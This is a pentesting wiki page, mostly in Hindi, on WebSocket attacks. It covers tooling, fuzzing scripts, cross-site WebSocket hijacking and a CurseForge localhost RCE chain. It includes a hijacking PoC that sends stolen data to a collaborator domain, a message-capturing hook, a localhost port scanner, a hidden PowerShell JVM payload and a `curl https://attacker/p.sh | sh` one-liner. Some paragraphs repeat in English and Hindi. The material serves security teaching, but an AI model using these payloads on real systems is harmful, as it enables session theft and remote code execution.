# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## WebSockets क्या हैं

WebSocket कनेक्शन प्रारम्भिक **HTTP** हैंडशेक के माध्यम से स्थापित होते हैं और इन्हें **लंबे समय तक चलने वाले** तरीके से डिज़ाइन किया गया है, जिससे किसी ट्रांज़ैक्शनल सिस्टम की आवश्यकता के बिना कभी भी द्विदिश संदेश भेजना/प्राप्त करना संभव होता है। यह WebSockets को उन एप्लिकेशनों के लिए विशेष रूप से लाभकारी बनाता है जिन्हें **कम विलंबता या सर्वर-आरंभित संचार** की आवश्यकता होती है, जैसे लाइव वित्तीय डेटा स्ट्रीम।

### WebSocket कनेक्शनों की स्थापना

WebSocket कनेक्शन स्थापित करने पर एक विस्तृत व्याख्या [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) पर देखी जा सकती है। संक्षेप में, WebSocket कनेक्शन आमतौर पर client-side JavaScript के माध्यम से आरंभ किए जाते हैं, जैसा कि नीचे दिखाया गया है:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
The `wss` प्रोटोकॉल एक WebSocket कनेक्शन को दर्शाता है जो **TLS** के साथ सुरक्षित है, जबकि `ws` एक **असुरक्षित** कनेक्शन को दर्शाता है।

कनेक्शन स्थापित करते समय, browser और server के बीच HTTP पर एक handshake किया जाता है। इस handshake प्रक्रिया में browser एक request भेजता है और server उत्तर देता है, जैसा कि निम्न उदाहरणों में दिखाया गया है:

Browser एक handshake request भेजता है:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
सर्वर का handshake response:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
कनेक्शन स्थापित होने के बाद दोनों दिशाओं में संदेश आदान-प्रदान के लिए खुला रहता है।

**WebSocket हैंडशेक के मुख्य बिंदु:**

- `Connection` और `Upgrade` हेडर WebSocket हैंडशेक की शुरुआत का संकेत देते हैं।
- `Sec-WebSocket-Version` हेडर इच्छित WebSocket प्रोटोकॉल संस्करण दर्शाता है, सामान्यतः `13`।
- एक Base64-एनकोडेड रैंडम वैल्यू `Sec-WebSocket-Key` हेडर में भेजी जाती है, जो सुनिश्चित करती है कि हर हैंडशेक अद्वितीय है, जिससे कैशिंग प्रॉक्सी से संबंधित समस्याओं को रोका जा सके। यह वैल्यू प्रमाणीकरण के लिए नहीं होती बल्कि यह पुष्टि करने के लिए होती है कि प्रतिक्रिया किसी misconfigured सर्वर या cache द्वारा जनरेट नहीं हुई है।
- सर्वर की प्रतिक्रिया में `Sec-WebSocket-Accept` हेडर `Sec-WebSocket-Key` का एक हैश होता है, जो यह सत्यापित करता है कि सर्वर WebSocket कनेक्शन खोलने की मंशा रखता है।

ये विशेषताएँ हैंडशेक प्रक्रिया को सुरक्षित और विश्वसनीय बनाती हैं, जो कुशल रियल-टाइम संचार के लिए मार्ग प्रशस्त करती हैं।

### Linux कंसोल

आप `websocat` का उपयोग websocket के साथ एक raw कनेक्शन स्थापित करने के लिए कर सकते हैं।
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
या एक websocat सर्वर बनाने के लिए:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

यदि आप पाते हैं कि clients आपके वर्तमान स्थानीय नेटवर्क से किसी **HTTP websocket** से जुड़े हैं, तो आप एक [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) करके client और server के बीच MitM attack कर सकते हैं।\
एक बार जब client आपसे कनेक्ट करने की कोशिश कर रहा हो, तब आप निम्न का उपयोग कर सकते हैं:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets एन्यूमरेशन

You can use the **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **to discover, fingerprint and search for known** **vulnerabilities** in websockets automatically.

### Websocket Debug tools

- **Burp Suite** सामान्य HTTP संचार की तरह ही websockets संचार के लिए MitM सपोर्ट करता है।
- The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** आपको Burp में Websocket communications को बेहतर तरीके से मैनेज करने की अनुमति देता है — जैसे **history** प्राप्त करना, **interception rules** सेट करना, **match and replace** rules का उपयोग करना, **Intruder** और **AutoRepeater** का इस्तेमाल करना।
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Short for "**WebSocket/Socket.io Proxy**", यह Node.js में लिखा गया टूल एक यूज़र इंटरफ़ेस प्रदान करता है ताकि आप **capture, intercept, send custom** messages कर सकें और क्लाइंट व सर्वर के बीच सभी WebSocket और Socket.IO संचार देख सकें।
- [**wsrepl**](https://github.com/doyensec/wsrepl) एक **interactive websocket REPL** है जो विशेष रूप से penetration testing के लिए डिज़ाइन किया गया है। यह **incoming websocket messages and sending new ones** को देखने के लिए इंटरफ़ेस देता है और इस संचार को **automating** करने के लिए एक आसान फ्रेमवर्क प्रदान करता है।
- [**https://websocketking.com/**](https://websocketking.com/) यह websockets का उपयोग करके अन्य वेब्स के साथ संचार करने के लिए एक वेब इंटरफ़ेस है।
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) अन्य प्रकार के communications/protocols के साथ-साथ websockets का उपयोग करके अन्य वेब्स के साथ संचार करने के लिए एक वेब इंटरफ़ेस प्रदान करता है।

## Websocket डिक्रिप्ट करना

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) आपके पास websockets का उपयोग करके एक वेब लॉन्च करने का code है और in [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) आप इसका explanation पा सकते हैं।

## Websocket Fuzzing

The burp extension [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) अब WebSocket messages को भी fuzz करने की अनुमति देता है। आप इस बारे में और जानकारी [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner) पर पढ़ सकते हैं।

### WebSocket Turbo Intruder (Burp extension)

PortSwigger's WebSocket Turbo Intruder Turbo Intruder–style Python scripting और high‑rate fuzzing को WebSockets पर लाता है। इसे BApp Store या source से इंस्टॉल करें। इसमें दो components शामिल हैं:

- Turbo Intruder: custom engines का उपयोग करके एकल WS endpoint पर high‑volume messaging।
- HTTP Middleware: एक लोकल HTTP endpoint एक्सपोज़ करता है जो bodies को persistent connection पर WS messages के रूप में फॉरवर्ड करता है, जिससे कोई भी HTTP‑based scanner WS backends को probe कर सके।

WS endpoint को fuzz करने और relevant responses को filter करने के लिए basic script pattern:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
जब एक संदेश कई प्रतिक्रियाएँ ट्रिगर करे तो शोर कम करने के लिए `@MatchRegex(...)` जैसे decorators का उपयोग करें।

### Bridge WS behind HTTP (HTTP Middleware)

स्थायी WS कनेक्शन को लपेटें और HTTP bodies को WS messages के रूप में आगे भेजें ताकि HTTP scanners के साथ स्वचालित परीक्षण किया जा सके:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
फिर स्थानीय रूप से HTTP भेजें; body WS message के रूप में forwarded किया जाता है:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
यह आपको WS backends चलाने देता है और “interesting” events (उदा., SQLi errors, auth bypass, command injection behavior) के लिए फ़िल्टर करने की सुविधा देता है।

### Socket.IO हैंडलिंग (handshake, heartbeats, events)

Socket.IO, WS के ऊपर अपना framing जोड़ता है। इसे अनिवार्य query parameter `EIO` (उदा., `EIO=4`) से पहचानें। सत्र को Ping (`2`) और Pong (`3`) के साथ जीवित रखें और बातचीत `"40"` से शुरू करें, फिर `42["message","hello"]` जैसे events emit करें।

Intruder उदाहरण:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
HTTP एडाप्टर वेरिएंट:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Socket.IO के माध्यम से सर्वर‑साइड prototype pollution का पता लगाना

PortSwigger की सुरक्षित पता लगाने की तकनीक का पालन करते हुए, Express के आंतरिक हिस्सों को pollute करने के लिए ऐसा payload भेजें:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
If greetings or behavior change (e.g., echo includes "Polluted"), you likely polluted server-side prototypes. Impact depends on reachable sinks; correlate with the gadgets in the Node.js prototype pollution section. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

डिफ़ॉल्ट इंजन एक ही कनेक्शन पर संदेशों को बैच करता है (उच्च throughput, रेस के लिए उपयुक्त नहीं)। कई WS कनेक्शन बनाने और पैरेलल में payloads फायर करने के लिए THREADED इंजन का उपयोग करें ताकि लॉजिक रेस (double‑spend, token reuse, state desync) ट्रिगर हों। उदाहरण स्क्रिप्ट से शुरू करें और `config()` में concurrency को ट्यून करें।

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

ऐसे WS फ्रेम बनाएं जिनका header बहुत बड़ा payload length घोषित करता है लेकिन body नहीं भेजी जाती। कुछ WS सर्वर length पर भरोसा करके buffers pre‑allocate करते हैं; इसे `Integer.MAX_VALUE` के पास सेट करने से Out‑Of‑Memory और रिमोट unauth DoS हो सकता है। उदाहरण स्क्रिप्ट देखें।

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Enable the WS Logger to capture and correlate messages using internal IDs.
- Use `inc*`/`dec*` helpers on `Connection` to tweak message ID handling in complex adapters.
- Decorators like `@PingPong`/`@Pong` and helpers like `isInteresting()` reduce noise and keep sessions alive.

### Operational safety

High‑rate WS fuzzing कई कनेक्शन खोल सकता है और प्रति सेकंड हजारों संदेश भेज सकता है। malformed frames और उच्च रेट्स असली DoS पैदा कर सकते हैं। केवल उन्हीं जगहों पर उपयोग करें जहाँ अनुमति हो।

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, also known as **cross-origin WebSocket hijacking**, is identified as a specific case of **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** affecting WebSocket handshakes. यह वह कमजोरी है जो तब पैदा होती है जब WebSocket handshakes केवल **HTTP cookies** के ज़रिये authenticate होते हैं और CSRF tokens या समान सुरक्षा उपाय मौजूद नहीं होते।

Attackers इस कमजोरियों का फायदा उठा सकते हैं एक **malicious web page** होस्ट करके जो vulnerable application के खिलाफ cross-site WebSocket connection आरम्भ करती है। नतीजतन, यह connection victime के application session का हिस्सा माना जाता है, और session handling में CSRF सुरक्षा की कमी का शोषण किया जा सकता है।

इस हमला के काम करने के लिए आवश्यकताएँ ये हैं:

- The websocket **authentication must be cookie based**
- The cookie must be accessible from the attackers server (this usually means **`SameSite=None`**) and no **Firefox Total Cookie Protection** enabled in Firefox and no **blocked third-party cookies** in Chrome.
- The websocket server must not check the origin of the connection (or this must be bypasseable)

Also:

- If the authentication is based on a local connection (to localhost or to a local network) the attack **will be possible** as no current protection forbids it (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

ध्यान दें कि जब आप एक **websocket** connection स्थापित करते हैं तो **cookie** सर्वर को **सीधा भेजी** जाती है। सर्वर इसका उपयोग करके प्रत्येक विशेष उपयोगकर्ता को उसके websocket session से संबंधित कर सकता है जो भेजी गई cookie पर आधारित होता है।

यदि, उदाहरण के लिए, websocket server किसी उपयोगकर्ता की बातचीत का इतिहास वापस भेजता है जब उसे "**READY**" मैसेज मिलता है, तो एक सरल XSS जो कनेक्शन स्थापित कर देती है (victim की **cookie** स्वतः ही भेज दी जाएगी ताकि उपयोगकर्ता authorize हो जाए) और "**READY**" भेजेगी, तो वह बातचीत का इतिहास प्राप्त कर पाएगी।
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie एक अलग subdomain के साथ

In this blog post [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) में हमलावर सफल रहा कि वह उस डोमेन के एक **execute arbitrary Javascript in a subdomain** में arbitrary Javascript execute कर सके जहाँ websocket संचार हो रहा था। क्योंकि यह एक **subdomain** था, **cookie** भेजी जा रही थी, और क्योंकि **Websocket didn't check the Origin properly**, इसके साथ संवाद करना संभव था और इससे **steal tokens from it** संभव हो गया।

### यूज़र से डेटा चोरी करना

जिस वेब एप्लिकेशन की आप impersonate करना चाहते हैं उसकी कॉपी बनाएं (उदा. .html फाइलें) और उस script के अंदर जहाँ websocket संचार हो रहा है यह कोड जोड़ें:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
अब `wsHook.js` फ़ाइल को [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) से डाउनलोड करें और **वेब फाइलों वाले फ़ोल्डर के अंदर सहेजें**.\
वेब एप्लिकेशन को एक्सपोज़ करके और किसी उपयोगकर्ता को इसमें कनेक्ट करवा कर आप websocket के माध्यम से भेजे और प्राप्त किए गए संदेश चुरा पाएँगे:
```javascript
sudo python3 -m http.server 80
```
### CSWSH सुरक्षा

The CSWSH attack is based on the fact that an **user will connect to a malicious page** that will **open a websocket connection** to a web page where the user is already connected and will authenticate as him as the request will send the user's cookies.

आजकल, इस समस्या को रोकना काफी आसान है:

- **Websocket server checking the origin**: websocket server को हमेशा यह जाँचना चाहिए कि user किस origin से कनेक्ट कर रहा है ताकि अनपेक्षित पेजेस को उससे कनेक्ट होने से रोका जा सके।
- **Authentication token**: Authentication को cookie पर आधारित करने के बजाय, websocket connection उस token पर आधारित हो सकता है जो server द्वारा user के लिए जनरेट किया गया हो और attacker को पता न हो (जैसे anti-CSRF token)।
- **SameSite Cookie attribute**: जिन cookies का `SameSite` value `Lax` या `Strict` है वे external attacker के पेज से victim server को भेजी नहीं जाएँगी; इसलिए cookie-based authentication सफल नहीं होगा। ध्यान दें कि Chrome अब उन cookies पर जिनमें यह flag specified नहीं है, default रूप से **`Lax`** value लगा देता है, जिससे यह डिफ़ॉल्ट रूप से अधिक सुरक्षित बन जाता है। हालांकि, cookie बनने के पहले 2 मिनट के दौरान इसका value **`None`** रहेगा, जिससे यह उस सीमित अवधि में vulnerable होगा (और उम्मीद है कि यह measure किसी बिंदु पर हटा दिया जाएगा)।
- **Firefox Total Cookie Protection**: Total Cookie Protection cookies को उसी site तक सीमित कर देता है जहाँ वे बनाए जाते हैं। मूलतः हर site की अपनी cookie storage partition होती है ताकि third parties user की browsing history को जोड़ न सकें। इससे **CSWSH अनुपयोग्य** हो जाता है क्योंकि attacker की साइट को cookies का access नहीं मिलेगा।
- **Chrome third-party cookies block**: यह authenticated user की cookie को websocket server को भेजे जाने से भी रोक सकता है, भले ही `SameSite=None` हो।

### Localhost WebSocket दुरुपयोग और browser पोर्ट खोज

Desktop launchers अक्सर helpers (उदा., CurseForge का `CurseAgent.exe`) लॉन्च करते हैं जो `127.0.0.1:<random_port>` पर JSON-RPC WebSockets expose करते हैं। ब्राउज़र loopback sockets पर SOP को लागू नहीं करता, इसलिए कोई भी Web page handshake करने का प्रयास कर सकता है। यदि agent arbitrary `Origin` values को स्वीकार करता है और secondary authentication छोड़ देता है, तो IPC surface सीधे JavaScript से रिमोटली नियंत्रित हो सकता है।

#### Enumerating exposed methods

एक legitimate session को capture करें ताकि protocol contract समझा जा सके। उदाहरण के लिए CurseForge ऐसे frames emit करता है: `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` जहाँ `name` RPC method है और `args` में structured objects (GUIDs, resolution, flags आदि) होते हैं। एक बार यह format ज्ञात हो जाने पर आप injected page से सीधे `createModpack`, `minecraftGetDefaultLocation` या किसी अन्य privileged task जैसी methods invoke कर सकते हैं।

#### Browser-based port discovery

चूँकि helper एक random high port पर bind करता है, exploit पहले localhost को WebSockets के माध्यम से brute-force करता है। Chromium-based browsers लगभग ~16k failed upgrades तक tolerate करते हैं इससे पहले कि throttling लगे, जो ephemeral range को स्कैन करने के लिए पर्याप्त है; Firefox कुछ सौ failures के बाद crash या freeze हो जाता है, इसलिए practical PoCs अक्सर Chromium को target करते हैं।

<details>
<summary>न्यूनतम ब्राउज़र स्कैनर</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

एक बार जब कोई कनेक्शन handshake से सफलतापूर्वक गुजरकर protocol-specific data लौटाता है, तो उस socket को RPC chain के लिए reuse करें।

#### JSON-RPC methods को RCE में जोड़ना

The CurseForge exploit दो बिना प्रमाणीकरण वाली कॉल्स को chain करता है:

1. `createModpack` → user interaction के बिना नया `MinecraftInstanceGuid` लौटाता है।
2. `minecraftTaskLaunchInstance` → `AdditionalJavaArguments` के जरिए arbitrary JVM flags स्वीकार करते हुए उस GUID को launch करता है।

JNI/JVM diagnostic options फिर एक turnkey RCE primitive प्रदान करते हैं। उदाहरण के लिए, metaspace को cap करके crash मजबूर करें और command execution के लिए error hook का लाभ उठाएँ:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
On Unix targets simply swap the payload with `/bin/sh -c 'curl https://attacker/p.sh | sh'`. This works even when you cannot touch the application code—controlling the JVM CLI is enough.

Unix targets पर केवल payload को `/bin/sh -c 'curl https://attacker/p.sh | sh'` से बदल दें। यह तब भी काम करता है जब आप application code को छू भी नहीं सकते — JVM CLI को नियंत्रित करना ही काफी है।

This “create resource → privileged launch” pattern appears often in updaters and launchers. Any time method (1) yields a server-tracked identifier and method (2) executes code or spawns a process with that identifier, check whether user-controlled arguments can be injected.

यह “create resource → privileged launch” pattern अक्सर updaters और launchers में दिखाई देता है। जब भी method (1) server-tracked identifier देता है और method (2) उस identifier के साथ कोड execute करता है या process spawn करता है, तब जाँचें कि क्या user-controlled arguments inject किए जा सकते हैं।


## Race Conditions

Race Conditions in WebSockets are also a thing, [check this information to learn more](race-condition.md#rc-in-websockets).

WebSockets में Race Conditions भी होते हैं, [इसी बारे में अधिक जानने के लिए यह जानकारी देखें](race-condition.md#rc-in-websockets).

## Other vulnerabilities

As Web Sockets are a mechanism to **send data to server side and client side**, depending on how the server and client handles the information, **Web Sockets can be used to exploit several other vulnerabilities like XSS, SQLi or any other common web vuln using input of s user from a websocket.**

चूँकि Web Sockets एक ऐसा mechanism है जिससे **send data to server side and client side** किया जा सकता है, server और client किस तरह information handle करते हैं उस पर निर्भर करते हुए, **Web Sockets का उपयोग कई अन्य कमजोरियों जैसे XSS, SQLi या किसी भी सामान्य web vuln को exploit करने के लिए किया जा सकता है जब websocket से user का input सामने आता है।**

## **WebSocket Smuggling**

This vulnerability could allow you to **bypass reverse proxies restrictions** by making them believe that a **websocket communication was stablished** (even if it isn't true). This could allow an attacker to **access hidden endpoints**. For more information check the following page:

यह कमज़ोरी आपको **bypass reverse proxies restrictions** करने की अनुमति दे सकती है, उन्हें यह विश्वास दिलाकर कि एक **websocket communication was stablished** (भले ही यह सच न हो)। इससे एक attacker को **access hidden endpoints** करने का मौका मिल सकता है। अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## References

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
